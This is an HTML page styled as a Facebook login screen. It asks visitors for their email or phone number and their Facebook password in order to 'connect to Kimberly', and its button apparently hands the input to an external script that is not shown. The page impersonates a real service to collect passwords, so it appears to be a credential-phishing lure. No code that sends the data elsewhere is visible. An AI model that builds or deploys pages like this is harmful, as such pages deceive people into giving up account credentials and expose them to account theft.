<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="test.css">
    <script src="test.js"></script>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>facebook</h1>
        </div>
        <div class="login-form">
            <img src="image/IMG_6472.JPG" alt="Monkey Logo" class="logo">
            <p>Log in to your Facebook account to connect to Kimberly</p>
            <form>
                <input id="email" type="text" placeholder="Mobile number or email address">
                <input id="password" type="password" placeholder="Facebook password">
                <button type="button" id="sub">Log in</button>
            </form>
            <a href="#" class="forgotten-password">Forgotten password?</a>
            <div class="create-account">
                <a href="#">Create account</a>
                <a href="#">Not now</a>
            </div>
            <a href="#" class="help-centre">Help Centre</a>
        </div>
    </div>
</body>
</html>
